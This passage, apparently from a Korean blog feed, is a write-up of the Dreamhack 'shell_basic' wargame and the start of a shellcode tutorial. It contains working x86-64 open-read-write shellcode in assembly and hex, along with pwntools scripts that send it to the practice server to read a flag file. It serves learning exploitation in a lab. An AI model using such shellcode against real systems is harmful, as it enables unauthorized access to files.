  &lt;li&gt;익스플로잇 가능 부분 확인&lt;/li&gt;
  &lt;li&gt;익스플로잇 당시의 스택 구조 체크&lt;/li&gt;
  &lt;li&gt;페이로드 초안 작성&lt;/li&gt;
  &lt;li&gt;익스플로잇 코드 작성&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;1-1-코드의-내용-확인&quot;&gt;1. (1) 코드의 내용 확인&lt;/h1&gt;

&lt;p&gt;입력한 셸코드를 실행하는 프로그램이다. 맨 처음에는 문제에서 미리 설명해준 것을 이해하지 못하고 BOF를 쓰는 걸까? 싶었지만 코드를 찬찬히 읽어보니 그냥 내가 입력한 셸코드를 실행해 주는 프로그램이었다….&lt;/p&gt;

&lt;p&gt;따라서 모두 뛰어넘고 5번을 수행하면 되겠다.&lt;/p&gt;

&lt;h1 id=&quot;2-5-익스플로잇-코드-작성&quot;&gt;2. (5) 익스플로잇 코드 작성&lt;/h1&gt;

&lt;p&gt;내가 원하는 동작을 정리해 보자.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;cat /home/shell_basic/flag_name_is_loooooong&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;그런데 cat을 실행하려면 쉘을 먼저 따야 한다. 즉, 쉘을 띄운다 → cat을 수행한다의 과정을 거쳐야 한다.  그러나, 쉘을 띄우는 과정에서 현재 내 수준으로는 무조건 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execveat&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec&lt;/code&gt; 등의 함수를 사용해야 하는데 코드 상에서도 그렇고, 문제 설명 상에서도 그렇고 main 함수 내부에서 해당 함수를 호출하는 것이 아니라면 실행 권한이 없게 설정되어 있다. 따라서 다른 방식을 찾아야 한다.&lt;/p&gt;

&lt;p&gt;두 번째 가능한 방법으로는 read/write 시스템 콜을 이용하는 것이다. 먼저 주어진 플래그의 경로에 있는 파일의 내용을 읽어온 후, 터미널에 write 하도록 하는 것이다. 직전에 만들어 보았던 orw 셸코드와 크게 차이가 있지는 않다.&lt;/p&gt;

&lt;p&gt;어셈블리어로 먼저 작성한 후, 기계어로 변환한 값을 넣어야 주어진 코드가 실행할 수 있을 것이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;위의 사진과 같이 선언된 부분에 내가 작성한 코드가 올라가고, 해당 코드의 시작 부분부터 종료까지를 실행하는 구조이기 때문이다.(나도 태어나서 이런 식으로 포인터 자료형을 바꾸어 데이터를 코드로 읽게끔 하는 플로우는 처음 보았기 때문에, 코드를 이해하며 많이 배웠다)&lt;/p&gt;

&lt;h2 id=&quot;어셈블리어로-작성하기&quot;&gt;어셈블리어로 작성하기&lt;/h2&gt;

&lt;p&gt;그럼 먼저 원하는 동작을 어셈블리어로 작성해 보자.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;우리가 &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step2/#/&quot;&gt;여기&lt;/a&gt;에서 배웠던 text segment는 다른 말로 code segment라고도 한다. 즉, 아래의 어셈블리 코드는 실행할 수 있는 인스트럭션이 탑재되는 주소에 다이렉트로 접근하면서 시작한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;
BITS 64
section .text ; text 섹션에 올라가는 것이므로
global _start ; NASM에게 시작 위치가 무엇으로 마킹되었는지를 알려준다

_start: 
; input string into the stack
mov r8, 0x676e6f6f6f6f6f6f
push r8
mov r8, 0x6c5f73695f656d61
push r8
mov r8, 0x6e5f67616c662f63
push r8
mov r8, 0x697361625f6c6c65 
push r8
mov r8, 0x68732f656d6f682f
push r8

; open(&quot;/home/shell_basic/flag_name_is_loooooong&quot;, O_RDONLY, NULL)
mov rdi, rsp
xor rsi, rsi
mov rax, 0x02
syscall

; read(fd, buf, 0x40)
mov rdi, rax
lea rsi, [rsp-0x40]
mov rdx, 0x40
mov rax, 0x00
syscall

; write(1, buf, 0x40)
mov rdi, 0x01
lea rsi, [rsp-0x40]
mov rdx, 0x30
mov rax, 0x01
syscall

; terminate the program
xor rdi, rdi
mov rax, 0x3c
syscall
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;“gnooooool_si_eman_galf/cisab_llehs/emoh/”을 hex로 변환하면:&lt;/p&gt;

    &lt;p&gt;676e6f6f6f6f6f6f 6c5f73695f656d61 6e5f67616c662f63 697361625f6c6c65 68732f656d6f682f&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;40byte이므로 한 번에 넣을 수가 없다. 8byte씩 5회에 나누어 레지스터에 넣고 스택에 push 해주는 과정을 거쳐야 한다.&lt;/li&gt;
  &lt;li&gt;스택에 들어간 텍스트 등의 데이터는 작은 주소에서 큰 주소로 읽고, 마지막의 한 chunk가(이 경우 8 byte) 8byte를 전부 채우지 못했을 경우 시스템은 거기에서 데이터가 끝났다고 인식한다고 추정했다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;기계어로-변환하기&quot;&gt;기계어로 변환하기&lt;/h2&gt;

&lt;p&gt;.asm 파일을 .o 파일로 변환하고, 이후 .bin 파일로 변환하여 해당 바이너리 값을 hex로 변환한다.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;nasm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;elf64&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shell_basic.asm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transfer&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;objdump&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shell_basic.o&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;disassemble&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;section&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;objcopy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--dump-section&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell_basic.bin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shell_basic.o&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xxd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.bin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xxd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.bin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled%201.jpeg&quot; alt=&quot;마지막 명령어까지 수행한 결과. hex값이 출력되었다.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;마지막 명령어까지 수행한 결과. hex값이 출력되었다.&lt;/p&gt;

&lt;p&gt;그렇게 나온 hex값을 쉘코드 형태로 가공해 입력해 보았다. 그 결과,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled%202.jpeg&quot; alt=&quot;아니 외않되&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아니 외않되&lt;/p&gt;

&lt;p&gt;안 되는 것을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;그렇다면 왜 안되는 것일까? 그 이유를 gdb를 붙여 알아보았다. 확인 결과, 내가 읽어오길 원하는 파일의 경로를 스택에 분명히 끊이지 않도록 잘 넣었음에도 불구하고 스택의 한 주소(8byte)만큼만 스트링을 읽어오는 것을 볼 수 있었다.&lt;/p&gt;

&lt;h1 id=&quot;3-문제-수정&quot;&gt;3. 문제 수정&lt;/h1&gt;

&lt;h2 id=&quot;1-null-byte&quot;&gt;#1. NULL Byte&lt;/h2&gt;

&lt;p&gt;앞서 알아낸 바에 따르면, 현재 원하는 경로를 스택에 잘 넣었음에도 불구하고 경로 문자열 전체를 인식하지 못하는 문제가 있었다. 분명히 시스템 상으로 어떤 문자열이 있다면 그 끝을 인지하고, 문자열을 올바르게 불러오는 장치가 있을 것이라 생각했다. 그렇지 않다는 것은 굉장히 비논리적이기 때문이었다.&lt;/p&gt;

&lt;p&gt;만일 그러한 장치가 없다고 가정해 보자. 그렇다면 파일 경로 이름은 8bytes로 제한될 것이고, C 언어 상에서 문자열을 저장하고 불러오는 것은 원천적으로 불가능할 것이다.&lt;/p&gt;

&lt;p&gt;여기까지 생각하니 생각나는 것이 있었다. 바로 C언어의 경우 문자열의 끝에 NULL 문자를 덧붙여 문자열의 끝을 표현한다는 점이었다. 따라서 해당 가설이 맞는지 스택에 가장 먼저 0x00 (ASCII 문자의 0번은 NULL byte이다)를 넣어두고 이하 원하는 값을 넣었다. 스택에 들어가는 값은 큰 주소부터 들어가고, 스택은 작은 주소부터 읽기 때문에 스택에 push 하는 값이 뒤집힌다는 점을 고려한 순서 지정이었다.&lt;/p&gt;

&lt;p&gt;따라서 해당 가설을 반영한 어셈블리어 코드는 아래와 같았다.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;
BITS 64
section .text ; text 섹션에 올라가는 것이므로
global _start ; NASM에게 시작 위치가 무엇으로 마킹되었는지를 알려준다

_start: 
; input string into the stack
mov r8, 0x00
push r8
mov r8, 0x676e6f6f6f6f6f6f
push r8
mov r8, 0x6c5f73695f656d61
push r8
.
.
.
(이하 상동)
.
.
.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;해당 어셈블리어를 어셈블한 결과는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;해당 결과를 파이프를 이용해 텍스트 파일에 저장하고, 쉘코드 형태로 가공한 후 원격 서버에 입력해 보았다.&lt;/p&gt;

&lt;p&gt;그 결과,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled%204.jpeg&quot; alt=&quot;아외또않되&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아외또않되&lt;/p&gt;

&lt;p&gt;안된다… C 언어로 짠 스켈레톤 코드에 올려서 gdb를 붙여서 확인해 봤는데, 분명히 제대로 되고 있었다. 심지어 flag 파일의 경로에 해당 파일을 만들어서 컴파일된 프로그램을 돌려 보았더니 제대로 파일의 값이 읽혀 나왔던 것까지 확인했는데 말이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled%205.jpeg&quot; alt=&quot;로컬 환경에서는 제대로 되는 모습을 확인.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;로컬 환경에서는 제대로 되는 모습을 확인.&lt;/p&gt;

&lt;h2 id=&quot;2-pwntools&quot;&gt;#2. Pwntools&lt;/h2&gt;
&lt;p&gt;그러다가 갑자기 생각났다. 설마, 프로그램 상에서 바이너리로 패킹해서 보내줘야 하는 걸까? 왠지 그럴 것 같았다. 네트워크를 통해 데이터가 전송될 경우 엔디안을 고려하지 않으면 원했던 것과는 정반대의 바이트가 갈 수 있다는 것을 BoB 수업 시간 때 배웠던 기억이 있었기 때문이었다.&lt;/p&gt;

&lt;p&gt;그래서 python을 이용해 내가 원하는 데이터를 원격으로 보내고, 그 결과를 받는 프로그램을 짰다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x41\xb8\x00\x00\x00\x00\x41\x50\x49\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x41\x50\x49\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x41\x50\x49\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x41\x50\x49\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x41\x50\x49\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x41\x50\x48\x89\xe7\x48\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x8d\x74\x24\xc0\xba\x40\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\x48\x8d\x74\x24\xc0\xba\x30\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;host3.dreamhack.games&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8603&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;그 결과, 성공했다! 경로가 지정하는 파일을 읽어 와 플래그를 확인할 수 있었다. 여기에 플래그는 올리지 않을 것이다. 드림핵에서 동일 문제를 푸는 사람들에게 스포일러가 될 수도 있기에…&lt;/p&gt;

&lt;p&gt;또 다른 방식으로 코드를 짤 수 있을까 싶어 두 번째 방법도 제안해 본다. 이 또한 플래그를 가져올 수 있는 코드였다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;amd64&apos;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&apos;
_start: 
mov r8, 0x00
push r8
mov r8, 0x676e6f6f6f6f6f6f
push r8
mov r8, 0x6c5f73695f656d61
push r8
mov r8, 0x6e5f67616c662f63
push r8
mov r8, 0x697361625f6c6c65 
push r8
mov r8, 0x68732f656d6f682f
push r8

mov rdi, rsp
xor rsi, rsi
mov rax, 0x02
syscall

mov rdi, rax
lea rsi, [rsp-0x40]
mov rdx, 0x40
mov rax, 0x00
syscall

mov rdi, 0x01
lea rsi, [rsp-0x40]
mov rdx, 0x30
mov rax, 0x01
syscall

xor rdi, rdi
mov rax, 0x3c
syscall
&apos;&apos;&apos;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;host3.dreamhack.games&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8603&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;내가 작성한 어셈블리 코드를 굳이 힘들게 쉘코드로 변환할 필요가 없어서 효율적이라 느낀 코드였다.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;4-앞으로-고칠-점&quot;&gt;4. 앞으로 고칠 점&lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;익스플로잇을 만들고 나서, 로컬 환경 대상으로 gdb를 돌려볼 것.
    &lt;ul&gt;
      &lt;li&gt;비슷한 과정을 반복할 필요가 없으므로 문제 풀이 시간이나 피드백 시간이 훨씬 단축될 것이다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;원격 환경에 셸코드 등의 바이너리를 보낼 땐 반드시 pwntools의 send()를 사용할 것.
    &lt;ul&gt;
      &lt;li&gt;제발 제발 제발 직접 입력하지 말고 프로그램을 이용하자.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Fri, 29 Jul 2022 00:08:23 +0900</pubDate>
        <link>http://localhost:4000/blog/dreamhack_system_hacking/step4-2</link>
        <guid isPermaLink="true">http://localhost:4000/blog/dreamhack_system_hacking/step4-2</guid>
      </item>
    
      <item>
        <title>System Hackig Step 4</title>
        <description>&lt;h1 id=&quot;stage-4&quot;&gt;STAGE 4&lt;/h1&gt;

&lt;h1 id=&quot;exploit-tech-shellcode&quot;&gt;Exploit Tech: ShellCode&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;시스템 해킹의 익스플로잇 기법 첫 번째: Shell Code&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;셸코드 개념&lt;/li&gt;
    &lt;li&gt;orw(open-read-write, 파일 읽고 쓰기) 셸코드 작성 및 디버깅&lt;/li&gt;
    &lt;li&gt;execve 셸코드 작성&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;셸코드란&quot;&gt;셸코드란?&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;익스플로잇을 수행하기 위해 제작된 어셈블리어 코드 조각&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;일반적으로 셸을 획득하기 위해 사용되어서 “셸”이 붙음&lt;/li&gt;
    &lt;li&gt;또한 그만큼 셸 획득은 시스템 해킹의 관점에서 매우 중요하다!&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step3-2/#/&quot;&gt;여기&lt;/a&gt;에서 예제를 풀면서 확인했듯, &lt;strong&gt;rip를 내가 실행하고 싶은 코드의 주소로 옮긴다면 원하는 코드가 실행되게끔 할 수 있다.&lt;/strong&gt; 특히 어셈블리어는 architecture dependency가 있으나 일단 알맞게만 작성한다면 기계어와 무조건 호환되므로 어셈블리어로 작성한 코드는 어셈블만 거쳐 곧장 CPU의 동작에 적용된다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;셸코드를 작성할 때의 주의사항:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;익스플로잇 대상 아키텍처와 운영체제, 그리고 목적을 모두 고려하며 작성한다.&lt;/li&gt;
  &lt;li&gt;실행될 당시의 메모리 상태를 적절히 반영한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;http://shell-storm.org/shellcode/&quot;&gt;자주 사용되는 셸코드가 공유된 사이트&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;범용적으로 작성된 것이므로 실행 당시의 메모리 상태를 반영하지는 못한다.&lt;/li&gt;
  &lt;li&gt;따라서 셸코드는 일반적으로 직접 작성해야 한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;orw-셸코드&quot;&gt;orw 셸코드&lt;/h1&gt;

&lt;p&gt;/tmp/flag를 읽을 수 있는 셸코드 작성하기&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;orw 셸코드: open-read-write 셸코드의 준말로, 파일을 열어서 읽은 뒤 화면에 출력해 주는 셸코드이다.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;셸코드는 보통 syscall을 사용하기 때문에, 셸코드 작성 전에 어떤 syscall이 익스플로잇에 필요한지 미리 생각해 두면 좋다.&lt;/li&gt;
    &lt;li&gt;구현하고 싶은 셸코드를 pseudo-code로 먼저 표현해 보자. 아무 형식이어도 괜찮지만 고급 언어 중에서도 레벨이 낮은 편인 C 언어 형식으로 표현하면 조금 더 편하다.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//flag 파일에 있는 글자수만큼+1의 버퍼 만들어 주기&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RD_ONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 목표 파일의 포인터와 접근 모드 가져오기&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 파일을 읽어 오기&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 1번, 즉 stdout인 콘솔에 읽어 온 buf 출력하기&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;여기에서 사용된 syscall은 총 세 가지, open, read, write 였다. 해당 syscall들의 상세 사양들을 알아보자.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;셸코드 작성에 필요한 syscall 목록&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th&gt;syscall&lt;/th&gt;
          &lt;th&gt;rax&lt;/th&gt;
          &lt;th&gt;arg0 (rdi)&lt;/th&gt;
          &lt;th&gt;arg1 (rsi)&lt;/th&gt;
          &lt;th&gt;arg2 (rdx)&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;read&lt;/td&gt;
          &lt;td&gt;0x00&lt;/td&gt;
          &lt;td&gt;unsigned int fd&lt;/td&gt;
          &lt;td&gt;char *buf&lt;/td&gt;
          &lt;td&gt;size_t count&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;write&lt;/td&gt;
          &lt;td&gt;0x01&lt;/td&gt;
          &lt;td&gt;unsigned int fd&lt;/td&gt;
          &lt;td&gt;const char *buf&lt;/td&gt;
          &lt;td&gt;size_t count&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;open&lt;/td&gt;
          &lt;td&gt;0x02&lt;/td&gt;
          &lt;td&gt;const char *filename&lt;/td&gt;
          &lt;td&gt;int flags&lt;/td&gt;
          &lt;td&gt;umode_t mode&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
&lt;/ul&gt;
